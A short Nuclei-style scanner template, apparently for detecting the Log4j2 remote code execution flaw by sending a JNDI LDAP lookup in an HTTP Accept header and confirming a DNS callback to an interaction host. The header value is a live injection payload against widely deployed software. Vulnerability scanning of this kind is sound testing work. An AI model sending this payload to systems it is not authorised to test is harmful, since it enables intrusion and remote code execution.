id: Apache_Log4j2_RCE

info:
  name: log4j2 Rmote Code Execute
  author: Tea
  severity: high
  tags: log4j2,exposure,CNVD-2021-95914

requests:
  - method: GET
    path:
      - "{{BaseURL}}"

    headers:
      Accept : ${jndi:ldap://{{interactsh-url}}/{{randstr}}}
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"